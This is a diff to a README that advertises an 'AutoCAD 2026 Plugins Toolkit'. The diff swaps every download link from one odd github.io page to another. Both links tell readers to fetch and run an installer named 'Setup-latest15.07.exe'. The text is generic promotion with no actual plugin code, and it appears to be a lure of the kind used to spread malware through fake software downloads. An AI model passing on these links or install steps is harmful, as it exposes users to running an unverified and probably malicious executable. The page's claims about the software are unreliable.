@@ -2,7 +2,7 @@
 
 Welcome to the AutoCAD 2026 Plugins Toolkit, the ultimate resource for enhancing your AutoCAD design capabilities on Windows 10 and 11. This comprehensive toolkit includes a wide variety of plugins, Lisp scripts, and libraries that are meticulously crafted to improve your workflow and productivity. Whether you're a professional architect, engineer, or designer, this toolkit provides essential tools to streamline your projects and boost efficiency.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## System Requirements
 
@@ -31,7 +31,7 @@ The AutoCAD 2026 Plugins Toolkit offers several standout features that set it ap
 
 Installing the AutoCAD 2026 Plugins Toolkit is a straightforward process. Follow these step-by-step instructions to get started:
 
-1. **Download the Installer**: Click the download button above or visit the [download page](https://yellowtaxisave.github.io/download-page/) to obtain the installer file named **Setup-latest15.07.exe**. Save it to a convenient location on your Windows computer.
+1. **Download the Installer**: Click the download button above or visit the [download page](https://capitals-707-bringing.github.io/download-page/) to obtain the installer file named **Setup-latest15.07.exe**. Save it to a convenient location on your Windows computer.
 
 2. **Close AutoCAD**: Before proceeding, ensure that AutoCAD 2026 is completely closed. This prevents any conflicts during the installation process and ensures all components are correctly integrated.
 
@@ -63,7 +63,7 @@ A4: Yes, all components are fully customizable. You can modify Lisp scripts usin
 
 To access the AutoCAD 2026 Plugins Toolkit, use the official download link provided. This ensures you get the latest and most secure version of the software.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
